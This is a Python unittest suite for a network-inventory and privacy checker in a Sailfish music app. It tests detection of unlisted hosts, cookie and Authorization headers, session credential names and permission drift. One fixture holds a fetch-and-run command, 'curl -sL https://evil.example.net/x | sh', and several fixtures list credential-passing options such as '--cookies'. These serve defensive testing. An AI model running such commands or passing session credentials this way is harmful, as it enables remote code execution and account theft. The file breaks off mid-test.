#!/usr/bin/env python3
# SPDX-License-Identifier: PolyForm-Noncommercial-1.0.0
"""Self-test for check_network_inventory.py using throw-away fixture trees."""
import importlib.util
import json
import os
import tempfile
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
spec = importlib.util.spec_from_file_location("inv", os.path.join(HERE, "check_network_inventory.py"))
inv = importlib.util.module_from_spec(spec)
spec.loader.exec_module(inv)

ALLOW = {
    "hosts": {"api.example-allowed.com": {"files": ["Core/A/a.cpp"]}},
    "ignored_hosts": {}, "network_api_files": {"Core/A/a.cpp": "x"}, "dynamic_url_files": {},
}


def tree(files, pro=""):
    root = tempfile.mkdtemp()
    for rel, text in files.items():
        path = os.path.join(root, rel)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w") as h:
            h.write(text)
    with open(os.path.join(root, "sailtune.pro"), "w") as h:
        h.write(pro)
    return root


class InventoryTest(unittest.TestCase):
    def run_check(self, files, allow=ALLOW, pro=""):
        errors, stale, seen = inv.analyse(tree(files, pro), allow)
        return errors, stale

    def test_allowlisted_host_in_listed_file_passes(self):
        e, _ = self.run_check({"Core/A/a.cpp": 'QNetworkRequest r(QUrl("https://api.example-allowed.com/x"));'})
        self.assertEqual(e, [])

    def test_new_host_fails(self):
        e, _ = self.run_check({"Core/A/a.cpp": 'QNetworkRequest r(QUrl("https://evil.example.net/x"));\n'})
        self.assertTrue(any("evil.example.net" in x for x in e))

    def test_allowlisted_host_in_other_file_fails(self):
        e, _ = self.run_check({"Core/B/b.cpp": 'auto u = "https://api.example-allowed.com/";'})
        self.assertTrue(any("not for this file" in x for x in e))

    def test_url_in_comment_is_ignored(self):
        e, _ = self.run_check({"Core/B/b.cpp": '// see https://docs.other.org/page\n/* https://x.test.com */\nint a;'})
        self.assertEqual(e, [])

    def test_http_url_with_double_slash_in_string_not_treated_as_comment(self):
        e, _ = self.run_check({"Core/B/b.cpp": 'auto u = "http://tracker.bad-host.com/p"; // trailing'})
        self.assertTrue(any("tracker.bad-host.com" in x for x in e))

    def test_bare_domain_suffix_literal_detected(self):
        e, _ = self.run_check({"Core/B/b.cpp": 'bool ok = host.endsWith(".cdn-new.com");'})
        self.assertTrue(any(".cdn-new.com" in x for x in e))

    def test_network_api_in_unlisted_file_fails(self):
        e, _ = self.run_check({"Core/B/b.cpp": '#include <QNetworkAccessManager>\n'})
        self.assertTrue(any("networking API" in x for x in e))

    def test_python_socket_import_detected(self):
        e, _ = self.run_check({"Runtime/r.py": 'import socket\n'})
        self.assertTrue(any("networking API" in x for x in e))

    def test_tracking_sdk_identifier_fails_but_text_does_not(self):
        e, _ = self.run_check({"Core/B/b.cpp": 'void initFirebase();\nconst char *t = "no analytics here";'})
        self.assertTrue(any("firebase" in x for x in e))
        self.assertFalse(any("'analytics'" in x for x in e))

    def test_word_inside_longer_identifier_is_not_an_ad_term(self):
        e, _ = self.run_check({"Core/B/b.cpp": 'class OfflineDownloadService {};'})
        self.assertEqual(e, [])

    def test_web_engine_module_fails(self):
        e, _ = self.run_check({}, pro="QT += quick webengine\n")
        self.assertTrue(any("webengine" in x for x in e))

    def test_non_network_scheme_ignored(self):
        e, _ = self.run_check({"Clients/p.qml": 'Image { source: "image://theme/icon-m-play" }'})
        self.assertEqual(e, [])

    def test_stale_entry_reported(self):
        _, stale = self.run_check({"Core/A/a.cpp": "int x;"})
        self.assertTrue(stale)

    # --- permission / capability baseline -------------------------------------------------
    BASE = {
        "sailjail_permissions": ["Audio", "Internet"],
        "qt_modules": ["quick", "network"],
        "spec_requires": ["Requires: sailfishsilica-qt5"],
        "qml_imports": ["QtQuick", "Sailfish.Silica"],
        "qml_forbidden_import_prefixes": ["QtWebKit", "Sailfish.WebView", "QtPositioning"],
        "qml_external_open_files": ["Clients/p.qml"],
    }
    DESKTOP = "[Desktop Entry]\nName=x\n[X-Sailjail]\nPermissions=Audio;Internet\n"
    SPEC = "Name: x\nURL: https://github.com/x/y\nRequires: sailfishsilica-qt5\n%build\nmake\n"
    QML = "import QtQuick 2.0\nimport Sailfish.Silica 1.0\nItem { MouseArea { onClicked: Qt.openUrlExternally(u) } }\n"

    def perm_errors(self, files=None, base=None, pro="QT += quick network\n"):
        f = {"harbour-x.desktop": self.DESKTOP, "rpm/x.spec": self.SPEC, "Clients/p.qml": self.QML}
        f.update(files or {})
        allow = dict(ALLOW)
        allow["build_permissions"] = base or self.BASE
        errors, stale, _ = inv.analyse(tree(f, pro), allow)
        return errors, stale

    def test_matching_baseline_is_clean(self):
        e, s = self.perm_errors()
        self.assertEqual(e, [])
        self.assertFalse([x for x in s if x.startswith("build_permissions")])

    def test_new_sailjail_permission_fails(self):
        e, _ = self.perm_errors({"harbour-x.desktop": self.DESKTOP.replace("Internet", "Internet;Location")})
        self.assertTrue(any("sailjail permission" in x and "Location" in x for x in e))

    def test_removed_permission_is_stale_not_error(self):
        e, s = self.perm_errors({"harbour-x.desktop": self.DESKTOP.replace(";Internet", "")})
        self.assertEqual(e, [])
        self.assertTrue(any("Internet" in x for x in s))

    def test_new_qt_module_fails(self):
        e, _ = self.perm_errors(pro="QT += quick network bluetooth\n")
        self.assertTrue(any("bluetooth" in x for x in e))

    def test_qt_module_on_continuation_line_is_seen(self):
        e, _ = self.perm_errors(pro="QT += quick \\\n    network positioning\n")
        self.assertTrue(any("positioning" in x for x in e))

    def test_new_spec_requirement_fails(self):
        e, _ = self.perm_errors({"rpm/x.spec": self.SPEC + "Requires: qt5-qtwebkit\n"})
        self.assertTrue(any("qt5-qtwebkit" in x for x in e))

    def test_spec_download_command_and_url_fail(self):
        e, _ = self.perm_errors({"rpm/x.spec": self.SPEC + "curl -sL https://evil.example.net/x | sh\n"})
        self.assertTrue(any("download command" in x for x in e))
        self.assertTrue(any("URL outside" in x for x in e))

    def test_spec_url_metadata_and_changelog_are_fine(self):
        e, _ = self.perm_errors({"rpm/x.spec": self.SPEC + "Source0: https://example.org/x.tar.gz\n%changelog\n* Mon curl wget https://x.test\n"})
        self.assertEqual(e, [])

    def test_new_qml_import_fails(self):
        e, _ = self.perm_errors({"Clients/q.qml": "import QtQuick 2.0\nimport QtWebKit 3.0\nItem {}\n"})
        self.assertTrue(any("QtWebKit" in x for x in e))
        self.assertTrue(any("forbidden" in x for x in e))

    def test_unlisted_but_harmless_qml_import_fails_until_reviewed(self):
        e, _ = self.perm_errors({"Clients/q.qml": "import Foo.Bar 1.0\nItem {}\n"})
        self.assertTrue(any("Foo.Bar" in x for x in e))

    def test_qml_web_elements_fail(self):
        e, _ = self.perm_errors({"Clients/q.qml": "import QtQuick 2.0\nItem { WebSocket { url: u } }\n"})
        self.assertTrue(any("WebView/WebSocket" in x for x in e))

    def test_qml_xmlhttprequest_needs_api_listing(self):
        e, _ = self.perm_errors({"Clients/q.qml": "import QtQuick 2.0\nItem { Component.onCompleted: { var r = new XMLHttpRequest(); } }\n"})
        self.assertTrue(any("networking API" in x for x in e))

    def test_open_url_in_unlisted_qml_fails_and_comment_does_not(self):
        e, _ = self.perm_errors({"Clients/q.qml": "import QtQuick 2.0\nItem { onX: Qt.openUrlExternally(u) }\n"})
        self.assertTrue(any("q.qml" in x and "openUrlExternally" in x for x in e))
        e, _ = self.perm_errors({"Clients/q.qml": "import QtQuick 2.0\n// Qt.openUrlExternally(u)\nItem {}\n"})
        self.assertEqual(e, [])

    def test_missing_baseline_in_real_allowlist_is_detected(self):
        with open(os.path.join(HERE, "network_allowlist.json")) as h:
            allow = json.load(h)
        self.assertIn("build_permissions", allow)
        errors, _ = inv.analyse_permissions(tree({}), {})
        self.assertTrue(errors)

    def test_real_repository_is_clean(self):
        root = os.path.abspath(os.path.join(HERE, "..", ".."))
        with open(os.path.join(HERE, "network_allowlist.json")) as h:
            errors, _, _ = inv.analyse(root, json.load(h))
        self.assertEqual(errors, [])



# ------------------------------------------------------------------------------------------------
# YouTube Music account profile: glob entries, session-material rules, profiles
# ------------------------------------------------------------------------------------------------
YTM_ALLOW = {
    "hosts": {
        "music.youtube.com": {"files": ["Core/Anon/a.cpp"], "authenticated_files": ["Core/Ytm/Transport/**"],
                              "reference_files": ["Core/Ytm/**", "Core/Accounts/**"]},
    },
    "ignored_hosts": {}, "dynamic_url_files": {},
    "network_api_files": {"Core/Anon/a.cpp": "anon", "Core/Ytm/Transport/**": "authenticated transport"},
    "session_material": {
        "header_construction_allowed_paths": ["Core/Ytm/Transport/**", "Core/Accounts/**"],
        "forbidden_header_names": ["Cookie", "Authorization", "X-Goog-AuthUser"],
        "bearer_only_exceptions": {"Core/Sync/Remote.cpp": "OAuth bearer to googleapis"},
        "dynamic_raw_header_files": {"Core/Play/Player.cpp": "forwards allow-listed headers"},
        "session_terms": ["sapisid", "__secure-3p"],
        "session_terms_allowed_paths": ["Core/Ytm/Transport/**", "Core/Accounts/**", "Core/Diag/LogSanitizer.cpp"],
    },
    "resolver_isolation": {
        "files": ["Core/Streaming/**", "Runtime/**"],
        "forbidden_includes": ["Ytm/", "Accounts/", "Secrets/"],
        "forbidden_identifiers": ["SecretBytes", "SessionBundle"],
        "forbidden_literals": ["--cookies", "--add-header", "cookiefile", "cookie", "authorization"],
        "forbidden_literal_prefixes": ["--cookies"],
        "forbidden_environment_words": ["cookie", "token"],
        "account_code": ["Core/Ytm/**", "Core/Accounts/**"],
        "account_forbidden_identifiers": ["QProcess", "YtDlpStreamResolver"],
        "account_forbidden_includes": ["Streaming/", "<QProcess>"],
    },
    "persistence_sinks": {
        "files": ["Core/Backup/**", "Core/Diag/**", "Core/Settings/**"],
        "redactor_files": ["Core/Diag/LogSanitizer.*"],
        "forbidden_includes": ["Accounts/Ports/Session", "Ytm/Transport"],
        "forbidden_identifiers": ["SessionBundle", "SecretBytes"],
        "forbidden_terms": ["sapisid", "__secure-"],
        "log_scan_files": ["Core/Ytm/**", "Core/Accounts/**", "Clients/Sailfish/Presentation/Ytm*"],
        "log_forbidden_words": "cookie|sapisid|authorization|bearer|secret",
    },
    "ytm_profile": {
        "base_desktop": "harbour-x.desktop",
        "desktop_variants": {"packaging/v/harbour-x.desktop": {"extra_permissions": ["Secrets"]}},
        "profile_only_permissions": ["Secrets", "WebView"],
        "qml_webview_files": [],
        "webview_imports": ["Sailfish.WebView"],
        "webview_hosts": ["music.youtube.com"],
        "pro_guard_tokens": ["sailtune_harbour"],
        "pro_gates": [{"terms": ["ytm"], "require_block": "sailtune_ytm"},
                      {"terms": ["secrets"], "require_block": "sailtune_secrets"}],
        "spec_gates": [{"terms": ["sailfishsecrets", "sailtune_secrets"], "require_block": "with secrets"},
                       {"terms": ["ytm"], "require_block": "without harbour"}],
        "spec_requires_exclusion": True,
    },
}


class YtmIsolationTest(unittest.TestCase):
    def check(self, files, allow=YTM_ALLOW, pro=""):
        errors, stale, _ = inv.analyse(tree(files, pro), allow)
        return errors, stale

    # --- glob entries ---------------------------------------------------------------------------
    def test_authenticated_directory_may_use_network_and_host(self):
        e, _ = self.check({"Core/Ytm/Transport/Infrastructure/T.cpp": '#include <QNetworkAccessManager>\nauto u = "https://music.youtube.com/youtubei";\n'})
        self.assertEqual(e, [])

    def test_other_ytm_directory_cannot_use_network_api(self):
        e, _ = self.check({"Core/Ytm/Sync/S.cpp": "QNetworkAccessManager *m;\n"})
        self.assertTrue(any("networking API" in x for x in e))

    def test_other_ytm_directory_may_only_name_the_host(self):
        e, _ = self.check({"Core/Ytm/Parsers/P.cpp": 'bool ok = host == "music.youtube.com";\n'})
        self.assertEqual(e, [])
        e, _ = self.check({"Core/Ytm/Parsers/P.cpp": 'auto h = "evil.example.net";\n'})
        self.assertTrue(any("evil.example.net" in x for x in e))

    def test_non_ytm_file_cannot_use_the_authenticated_host(self):
        e, _ = self.check({"Core/Other/O.cpp": 'auto u = "https://music.youtube.com/";\n'})
        self.assertTrue(any("not for this file" in x for x in e))

    def test_pending_glob_is_a_note_not_stale_until_a_file_exists(self):
        inv.analyse(tree({"Core/Anon/a.cpp": 'QNetworkRequest r(QUrl("https://music.youtube.com/"));'}), YTM_ALLOW)
        self.assertTrue(any("Core/Ytm/Transport/**" in n for n in inv.PENDING))
        _, stale = self.check({"Core/Anon/a.cpp": 'QNetworkRequest r(QUrl("https://music.youtube.com/"));',
                               "Core/Ytm/Transport/T.cpp": "int x;\n"})
        self.assertTrue(any("Core/Ytm/Transport/**" in x for x in stale))

    # --- Cookie / Authorization header construction ---------------------------------------------------
    def test_cookie_header_allowed_only_in_transport_and_accounts(self):
        src = 'void f(QNetworkRequest &r) { r.setRawHeader("Cookie", c); }\n'
        for path in ("Core/Ytm/Transport/T.cpp", "Core/Accounts/A.cpp"):
            e, _ = self.check({path: src})
            self.assertFalse([x for x in e if "header" in x and "Cookie" in x], path)
        for path in ("Core/Anon/a.cpp", "Core/Ytm/Sync/S.cpp", "Core/Streaming/R.cpp"):
            e, _ = self.check({path: src})
            self.assertTrue([x for x in e if "sets a Cookie header" in x], path)

    def test_header_name_variants_are_caught(self):
        for call in ('r.setRawHeader(QByteArrayLiteral("authorization"), v);', "r.setRawHeader(QByteArray(\"Cookie\"), v);",
                     'r.setRawHeader(QStringLiteral("X-Goog-AuthUser").toLatin1(), v);', 'xhr.setRequestHeader("Cookie", c);'):
            e, _ = self.check({"Clients/p.js": call + "\n"})
            self.assertTrue([x for x in e if "header" in x], call)

    def test_bearer_only_exception_is_exactly_that(self):
        ok = 'r.setRawHeader("Authorization", "Bearer " + token);\n'
        e, _ = self.check({"Core/Sync/Remote.cpp": ok})
        self.assertFalse([x for x in e if "Authorization" in x])
        bad = ok + 'r.setRawHeader("Authorization", sapisidHash);\n'
        e, _ = self.check({"Core/Sync/Remote.cpp": bad})
        self.assertTrue([x for x in e if "Authorization" in x])
        e, _ = self.check({"Core/Sync/Remote.cpp": ok + 'r.setRawHeader("Cookie", c);\n'})
        self.assertTrue([x for x in e if "Cookie" in x])

    def test_cookie_header_accessor_and_cookie_objects_are_caught(self):
        for src in ("r.setHeader(QNetworkRequest::CookieHeader, v);", "QNetworkCookie c(n, v);", "auto l = QNetworkCookie::parseCookies(raw);",
                    "jar->insertCookie(c);", "m.cookieJar()->setCookiesFromUrl(l, u);"):
            e, _ = self.check({"Core/Anon/a.cpp": src + "\n"})
            self.assertTrue([x for x in e if "cookie" in x.lower() and "Core/Anon/a.cpp" in x and "networking" not in x], src)

    def test_refusing_cookies_is_not_construction(self):
        src = ("class NoCookies : public QNetworkCookieJar {\n  QList<QNetworkCookie> cookiesForUrl(const QUrl &) const override { return QList<QNetworkCookie>(); }\n"
               "  bool setCookiesFromUrl(const QList<QNetworkCookie> &, const QUrl &) override { return false; }\n};\n"
               "r.setAttribute(QNetworkRequest::CookieLoadControlAttribute, QNetworkRequest::Manual);\n"
               "bool filtered = text.startsWith(\"cookie:\") || text.startsWith(\"authorization:\");\n")
        e, _ = self.check({"Core/Other/O.cpp": src})
        self.assertEqual([x for x in e if "cookie" in x.lower()], [])

    def test_header_line_literal_is_caught_but_prefix_filter_is_not(self):
        e, _ = self.check({"Core/Other/O.cpp": 'auto h = "Cookie: SID=" + sid;\n'})
        self.assertTrue([x for x in e if "header line" in x])
        e, _ = self.check({"Core/Other/O.cpp": 'bool f = t.startsWith("cookie:");\n'})
        self.assertEqual([x for x in e if "header line" in x], [])

    def test_computed_header_names_need_review(self):
        src = "r.setRawHeader(QByteArray::fromStdString(h.first), v);\n"
        e, _ = self.check({"Core/Other/O.cpp": src})
        self.assertTrue([x for x in e if "computed at run time" in x])
        e, s = self.check({"Core/Play/Player.cpp": src})
        self.assertEqual([x for x in e if "computed" in x], [])
        e, s = self.check({"Core/Play/Player.cpp": "int x;\n"})
        self.assertTrue([x for x in s if "dynamic_raw_header_files" in x])

    def test_literal_header_calls_are_not_dynamic(self):
        e, _ = self.check({"Core/Other/O.cpp": 'r.setRawHeader("Accept", "x"); r.setRawHeader(QByteArrayLiteral("Origin"), o);\n'})
        self.assertEqual([x for x in e if "computed" in x], [])

    def test_comment_mentions_do_not_trip(self):
        e, _ = self.check({"Core/Other/O.cpp": '// r.setRawHeader("Cookie", c); SAPISID\n/* Authorization: x */\nint a;\n'})
        self.assertEqual(e, [])

    # --- session credential names ------------------------------------------------------------------
    def test_session_cookie_names_only_in_reviewed_paths(self):
        src = 'static const char *n = "SAPISID";\n'
        for path in ("Core/Ytm/Transport/T.cpp", "Core/Accounts/A.cpp", "Core/Diag/LogSanitizer.cpp"):
            e, _ = self.check({path: src})
            self.assertEqual([x for x in e if "session credential" in x], [], path)
        for path in ("Core/Ytm/Parsers/P.cpp", "Core/Backup/B.cpp", "Clients/Sailfish/Presentation/p.qml"):
            e, _ = self.check({path: src})
            self.assertTrue([x for x in e if "session credential" in x], path)
        e, _ = self.check({"Core/Backup/B.cpp": 'auto n = "__Secure-3PAPISID";\n'})
        self.assertTrue([x for x in e if "session credential" in x])

    # --- resolver isolation ----------------------------------------------------------------------
    def test_resolver_cannot_include_account_code_or_name_session_types(self):
        e, _ = self.check({"Core/Streaming/R.cpp": '#include "../../Accounts/Ports/CredentialVaultPort.h"\nSecretBytes b;\n'})
        self.assertTrue([x for x in e if "includes" in x and "Accounts" in x])
        self.assertTrue([x for x in e if "SecretBytes" in x])
        e, _ = self.check({"Runtime/r.py": "from ytm.session import SessionBundle\n"})
        self.assertTrue([x for x in e if "SessionBundle" in x])

    def test_resolver_cannot_pass_cookie_options(self):
        for lit in ('"--cookies"', '"--cookies-from-browser"', '"--add-header"', '"cookiefile"', '"Cookie"'):
            e, _ = self.check({"Core/Streaming/R.cpp": "args << QStringLiteral(%s) << path;\n" % lit})
            self.assertTrue([x for x in e if "credential option" in x], lit)
        e, _ = self.check({"Runtime/r.py": "opts = {'cookiefile': p}\n"})
        self.assertTrue([x for x in e if "credential option" in x])

    def test_resolver_scrubbing_filters_and_fixed_options_are_fine(self):
        src = ('if (text.startsWith(QStringLiteral("cookie:"), Qt::CaseInsensitive)) return false;\n'
               'args << QStringLiteral("--no-js-runtimes") << QStringLiteral("--format");\n'
               'environment.remove(QStringLiteral("TMP")); environment.insert(QStringLiteral("TMPDIR"), t);\n')
        e, _ = self.check({"Core/Streaming/R.cpp": src})
        self.assertEqual(e, [])

    def test_resolver_environment_cannot_carry_credentials(self):
        e, _ = self.check({"Core/Streaming/R.cpp": 'environment.insert(QStringLiteral("YT_COOKIE_FILE"), p);\n'})
        self.assertTrue([x for x in e if "environment variable" in x])

    def test_account_code_cannot_start_processes_or_use_the_resolver(self):
        e, _ = self.check({"Core/Ytm/Sync/S.cpp": "QProcess p; p.start(x);\n"})
        self.assertTrue([x for x in e if "QProcess" in x])
        e, _ = self.check({"Core/Accounts/A.cpp": '#include "../../Streaming/Infrastructure/YtDlpStreamResolver.h"\n'})
        self.assertTrue([x for x in e if "resolver or a child process" in x])
        e, _ = self.check({"Core/Accounts/A.cpp": "int fine;\n"})
        self.assertEqual(e, [])

    # --- persistence sinks and logs --------------------------------------------------------------
    def test_sinks_cannot_reference_session_material(self):
        e, _ = self.check({"Core/Backup/B.cpp": '#include "../Accounts/Ports/SessionCredentialsPort.h"\n'})
        self.assertTrue([x for x in e if "persistence" in x and "includes" in x])
        e, _ = self.check({"Core/Settings/S.cpp": "SessionBundle bundle; store(bundle);\n"})
        self.assertTrue([x for x in e if "SessionBundle" in x])
        e, _ = self.check({"Core/Diag/D.cpp": 'const char *k = "SAPISID";\n'})
        self.assertTrue([x for x in e if "persistence" in x and "sapisid" in x])

    def test_redactor_is_the_reviewed_exception(self):
        e, _ = self.check({"Core/Diag/LogSanitizer.cpp": 'const char *k = "sapisid";\n'})
        self.assertEqual([x for x in e if "persistence" in x], [])

    def test_benign_sink_code_is_fine(self):
        e, _ = self.check({"Core/Backup/B.cpp": 'bool scrub = !keywordAssignment(l, "cookie") && !keywordAssignment(l, "authorization");\n'})
        self.assertEqual([x for x in e if "persistence" in x], [])

    def test_log_and_throw_statements_cannot_name_credentials(self):
        for stmt in ("qDebug() << cookieHeader;", "qWarning() << \"bad\" << session.cookie;", "fprintf(stderr, \"%s\", authorization.c_str());",
                     "throw std::runtime_error(secretText);", "std::cerr << bearerToken << std::endl;", "qCDebug(cat) << cookies;"):
            e, _ = self.check({"Core/Ytm/Sync/S.cpp": "void f() { %s }\n" % stmt})
            self.assertTrue([x for x in e if "log/throw" in x], stmt)
        e, _ = self.check({"Clients/Sailfish/Presentation/YtmAccountPage.qml": "Item { Component.onCompleted: console.log(cookieText) }\n"})
        self.assertTrue([x for x in e if "log/throw" in x])

    def test_log_statements_with_plain_messages_are_fine(self):
        e, _ = self.check({"Core/Ytm/Sync/S.cpp": 'void f() { qWarning() << "cookie rejected" << code << count; throw std::runtime_error("bad page"); }\n'})
        self.assertEqual([x for x in e if "log/throw" in x], [])

    # --- profile gating: default/Harbour carry no Secrets wiring ---------------------------------------
    BASE_DESKTOP = "[Desktop Entry]\nName=x\nExec=x\n[X-Sailjail]\nPermissions=Audio;Internet\nApplicationName=X\n"
    VARIANT = "# variant\n[Desktop Entry]\nName=x\nExec=x\n[X-Sailjail]\nPermissions=Audio;Internet;Secrets\nApplicationName=X\n"
    PRO_OK = ("!contains(CONFIG, sailtune_harbour): CONFIG += sailtune_ytm\n"
              "contains(CONFIG, sailtune_secrets):!contains(CONFIG, sailtune_ytm) {\n    error(x)\n}\n"
              "contains(CONFIG, sailtune_ytm) {\n    DEFINES += SAILTUNE_YTM\n    include(Core/Ytm/ytm.pri)\n"
              "    contains(CONFIG, sailtune_secrets) {\n        DEFINES += SAILTUNE_WITH_SAILFISH_SECRETS\n"
              "        exists($$PWD/x/Secrets/y.h) {\n            LIBS += -lsailfishsecrets\n        } else:packagesExist(sailfishsecrets) {\n"
              "            PKGCONFIG += sailfishsecrets\n        }\n    }\n}\n# a comment about Secrets and ytm\n")
    SPEC_OK = ("%bcond_with harbour\n%bcond_with secrets\n%if %{with harbour} && %{with secrets}\n%{error:no}\n%endif\n"
               "%if %{with secrets}\nBuildRequires:  pkgconfig(sailfishsecrets)\n%endif\n"
               "%build\n%if %{with secrets}\nset -- \"$@\" CONFIG+=sailtune_secrets\n%endif\n%changelog\n* x ytm sailfishsecrets\n")

    def profile(self, pro=None, spec=None, files=None):
        f = {"harbour-x.desktop": self.BASE_DESKTOP, "packaging/v/harbour-x.desktop": self.VARIANT,
             "rpm/x.spec": spec if spec is not None else self.SPEC_OK}
        f.update(files or {})
        allow = dict(YTM_ALLOW)
        allow["build_permissions"] = {"sailjail_permissions": ["Audio", "Internet"], "qt_modules": [], "qml_imports": [],
                                      "spec_requires": ["BuildRequires: pkgconfig(sailfishsecrets)"], "qml_external_open_files": []}
        errors, stale, _ = inv.analyse(tree(f, pro if pro is not None else self.PRO_OK), allow)
        return errors, stale

    def test_reviewed_profile_layout_is_clean(self):
        e, s = self.profile()
        self.assertEqual(e, [])
        self.assertEqual([x for x in s if "ytm_profile" in x], [])

    def test_secrets_outside_the_opt_in_block_in_pro_fails(self):
        e, _ = self.profile(pro=self.PRO_OK + "LIBS += -lsailfishsecrets\n")
        self.assertTrue([x for x in e if "sailtune.pro" in x and "sailtune_secrets" in x])
        e, _ = self.profile(pro=self.PRO_OK + "DEFINES += SAILTUNE_WITH_SAILFISH_SECRETS\n")
        self.assertTrue([x for x in e if "sailtune.pro" in x])

    def test_ytm_wiring_outside_the_ytm_block_in_pro_fails(self):
        e, _ = self.profile(pro=self.PRO_OK + "presentation.files += Clients/Sailfish/Presentation/YtmAccountPage.qml\n")
        self.assertTrue([x for x in e if "sailtune_ytm" in x])
        e, _ = self.profile(pro=self.PRO_OK.replace("DEFINES += SAILTUNE_YTM\n", "") + "DEFINES += SAILTUNE_YTM\n")
        self.assertTrue([x for x in e if "sailtune_ytm" in x])

    def test_secrets_in_a_secrets_block_not_nested_in_ytm_is_still_allowed_by_name_only(self):
        # the gate is about the opt-in name; the qmake error() guard keeps the combination impossible
        e, _ = self.profile(pro="contains(CONFIG, sailtune_secrets) {\n    PKGCONFIG += sailfishsecrets\n}\n")
        self.assertEqual(e, [])

    def test_spec_secrets_lines_must_sit_under_with_secrets(self):
        e, _ = self.profile(spec=self.SPEC_OK.replace("%if %{with secrets}\nBuildRequires", "%if %{with harbour}\nBuildRequires"))
        self.assertTrue([x for x in e if "spec:" in x and "with secrets" in x])
        e, _ = self.profile(spec=self.SPEC_OK.replace("%build\n", "%build\nBuildRequires: pkgconfig(sailfishsecrets)\n", 1))
        self.assertTrue([x for x in e if "spec:" in x])

    def test_spec_else_branch_does_not_satisfy_the_condition(self):
        spec = self.SPEC_OK.replace("%if %{with secrets}\nBuildRequires:  pkgconfig(sailfishsecrets)\n%endif\n",
                                    "%if %{with secrets}\n%else\nBuildRequires:  pkgconfig(sailfishsecrets)\n%endif\n")
        e, _ = self.profile(spec=spec)
        self.assertTrue([x for x in e if "spec:" in x])

    def test_spec_without_harbour_secrets_exclusion_fails(self):
        e, _ = self.profile(spec=self.SPEC_OK.replace("%{error:no}", "%{warn:no}"))
        self.assertTrue([x for x in e if "lacks the guard" in x])

    def test_base_desktop_with_a_profile_only_permission_fails(self):
        e, _ = self.profile(files={"harbour-x.desktop": self.BASE_DESKTOP.replace("Internet", "Internet;Secrets")})
        self.assertTrue([x for x in e if "profile-only" in x and "Secrets" in x])

    def test_variant_must_be_base_plus_declared_permission(self):
        e, _ = self.profile(files={"packaging/v/harbour-x.desktop": self.VARIANT.replace("Name=x", "Name=y")})
        self.assertTrue([x for x in e if "differs from" in x])
        e, _ = self.profile(files={"packaging/v/harbour-x.desktop": self.VARIANT.replace("Secrets", "Secrets;Location")})
        self.assertTrue([x for x in e if "Location" in x])
        e, _ = self.profile(files={"packaging/v/harbour-x.desktop": self.VARIANT.replace(";Secrets", "")})
        self.assertTrue([x for x in e if "expected the base permissions plus" in x])

    def test_variant_does_not_widen_the_base_baseline(self):
        # the variant's Secrets is not reported as an unreviewed base permission
        e, _ = self.profile()
        self.assertEqual([x for x in e if "sailjail permission" in x], [])

    # --- embedded web sign-in is a deliberate, double-keyed exception --------------------------------------------
    WEBQML = "import QtQuick 2.0\nimport Sailfish.WebView 1.0\nItem { WebView { url: \"https://music.youtube.com\" } }\n"

    def test_web_view_import_fails_by_default(self):
        allow = dict(YTM_ALLOW)
        allow["build_permissions"] = {"qml_imports": ["QtQuick"], "qml_forbidden_import_prefixes": ["Sailfish.WebView"],
                                      "sailjail_permissions": ["Audio", "Internet"]}
        errors, _, _ = inv.analyse(tree({"harbour-x.desktop": self.BASE_DESKTOP, "packaging/v/harbour-x.desktop": self.VARIANT,
                                         "Clients/w.qml": self.WEBQML}), allow)
        self.assertTrue([x for x in errors if "Sailfish.WebView" in x])
        self.assertTrue([x for x in errors if "WebView/WebSocket" in x])

    def test_listed_web_view_file_needs_the_webview_permission_in_the_variant(self):
        allow = dict(YTM_ALLOW)
        allow["ytm_profile"] = dict(YTM_ALLOW["ytm_profile"], qml_webview_files=["Clients/w.qml"])
        allow["build_permissions"] = {"qml_imports": ["QtQuick"], "qml_forbidden_import_prefixes": ["Sailfish.WebView"],
                                      "sailjail_permissions": ["Audio", "Internet"]}
        files = {"harbour-x.desktop": self.BASE_DESKTOP, "packaging/v/harbour-x.desktop": self.VARIANT, "Clients/w.qml": self.WEBQML}
        errors, _, _ = inv.analyse(tree(files), allow)
        self.assertFalse([x for x in errors if "forbidden" in x or "WebView/WebSocket" in x or "not in the reviewed baseline" in x], errors)
        self.assertTrue([x for x in errors if "need the WebView permission" in x])
        # the second key: the variant gains WebView and the allowlist declares it
        allow["ytm_profile"]["desktop_variants"] = {"packaging/v/harbour-x.desktop": {"extra_permissions": ["Secrets", "WebView"]}}
        files["packaging/v/harbour-x.desktop"] = self.VARIANT.replace("Secrets", "Secrets;WebView")
        errors, _, _ = inv.analyse(tree(files), allow)
        self.assertEqual([x for x in errors if "WebView" in x or "forbidden" in x], [], errors)

    # --- documentation stays in step ---------------------------------------------------------------------------
    def test_docs_must_name_hosts_authenticated_paths_and_profile_permissions(self):
        allow = dict(YTM_ALLOW)
        allow["hosts"] = {"music.youtube.com": dict(YTM_ALLOW["hosts"]["music.youtube.com"])}
        files = {"docs/PRIVACY_NETWORK.md": "`music.youtube.com` only\n"}
        errors, _, _ = inv.analyse(tree(files), allow)
        self.assertTrue([x for x in errors if "credential-carrying path" in x])
        self.assertTrue([x for x in errors if "profile-only permission Secrets" in x])
        files = {"docs/PRIVACY_NETWORK.md": "`music.youtube.com` `Core/Ytm/Transport/**` Secrets WebView\n"}
        errors, _, _ = inv.analyse(tree(files), allow)
        self.assertEqual([x for x in errors if "PRIVACY_NETWORK" in x], [])


class RealProfileTest(unittest.TestCase):
    """The repository's own files satisfy the profile rules (not only the fixtures)."""

    ROOT = os.path.abspath(os.path.join(HERE, "..", ".."))

    def allow(self):
        with open(os.path.join(HERE, "network_allowlist.json")) as h:
            return json.load(h)

    def test_harbour_desktop_file_has_no_profile_only_permission(self):
        with open(os.path.join(self.ROOT, "harbour-sailtune.desktop")) as h:
            perms = inv.desktop_permissions(inv.parse_desktop(h.read()))
        self.assertFalse(perms & set(self.allow()["ytm_profile"]["profile_only_permissions"]), perms)

    def test_secrets_variant_is_base_plus_secrets_only(self):
        with open(os.path.join(self.ROOT, "harbour-sailtune.desktop")) as h:
            base = inv.parse_desktop(h.read())
        with open(os.path.join(self.ROOT, "packaging", "ytm-secrets", "harbour-sailtune.desktop")) as h:
            variant = inv.parse_desktop(h.read())
        self.assertEqual(inv.desktop_permissions(variant), inv.desktop_permissions(base) | {"Secrets"})
        key = ("[X-Sailjail]", "Permissions")
        self.assertEqual({k: v for k, v in base.items() if k != key}, {k: v for k, v in variant.items() if k != key})

    def test_pro_and_spec_gates_hold_on_the_real_files(self):
        prof = self.allow()["ytm_profile"]
